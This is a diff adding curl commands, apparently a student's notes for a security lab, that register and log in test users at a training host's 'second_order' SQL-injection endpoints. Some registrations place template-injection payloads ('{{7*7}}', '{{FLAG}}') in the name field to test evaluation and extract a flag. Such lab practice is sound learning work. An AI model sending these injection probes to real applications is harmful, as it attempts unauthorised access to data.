@@ -1,0 +1,10 @@
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser","name":"test","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser","name":"test1","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser2","name":"test1","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser2","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser3","name":"{{7*7}}","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser3","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser4","name":"{{FLAG}}","password":"test123"}'
+curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \\n-H "Content-Type: application/json" \\n-d '{"username":"testuser4","password":"test123"}'
